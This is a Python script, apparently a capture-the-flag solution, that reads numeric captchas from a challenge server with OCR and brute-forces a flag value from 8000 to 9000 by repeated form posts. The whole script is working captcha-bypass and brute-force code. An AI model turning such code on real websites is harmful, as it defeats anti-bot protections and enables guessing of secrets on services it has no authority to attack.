import requests
from PIL import Image
from io import BytesIO
import pytesseract


class CaptchaSolver:
    def __init__(self, base_url, start_flag, end_flag, chall_number):
        self.base_url = base_url
        self.start_flag = start_flag
        self.end_flag = end_flag
        self.captcha_url = f"{base_url}/captcha.php"
        self.submit_url = f"{base_url}/captcha{chall_number}/"
        self.session = requests.Session()  # pas forcément utile mais on ne sait jamais

    def get_captcha_text(self):
        """
        La fonction `get_captcha_text` récupère le texte d'une image captcha en utilisant pytesseract en
        Python.
        :return: La fonction `get_captcha_text` renvoie le texte extrait de l'image captcha après l'avoir
        traité à l'aide de pytesseract.
        """
        response = self.session.get(self.captcha_url)
        image = Image.open(BytesIO(response.content))
        captcha_text = pytesseract.image_to_string(
            image, config="-c tessedit_char_whitelist=0123456789 --psm 6"
        )
        return captcha_text.strip()

    def submit_form(self, flag, captcha_text):
        form_data = {"flag": flag, "captcha": captcha_text, "submit": "Envoyer"}
        response = self.session.post(self.submit_url, data=form_data)
        return response.text

    def brute_force(self):
        """
        La fonction `brute_force` parcourt les valeurs des indicateurs, résout un captcha et soumet un
        formulaire jusqu'à ce qu'un indicateur correct soit trouvé.
        :return: La méthode `brute_force` renvoie la valeur correcte de l'indicateur si elle est trouvée
        pendant le processus d'itération. Si aucune valeur d'indicateur correcte n'est trouvée après avoir
        parcouru toutes les valeurs d'indicateur possibles, il renverra « Aucune ».
        """
        for flag_value in range(self.start_flag, self.end_flag):
            captcha_text = self.get_captcha_text()
            if len(captcha_text) == 6:
                print(f"Trying flag value: {flag_value}")
                print("Captcha Solved as:", captcha_text)
                response_text = self.submit_form(flag_value, captcha_text)
                if "Correct" in response_text:
                    print(f"Correct flag found: {flag_value}")
                    return flag_value
        return None

    def close_session(self):
        self.session.close()


solver = CaptchaSolver("http://31.220.95.27:9002", 8000, 9001, 5)

result = solver.brute_force()
if result:
    print(f"Flag {result} is correct.")
else:
    print("No valid flags found.")
solver.close_session()
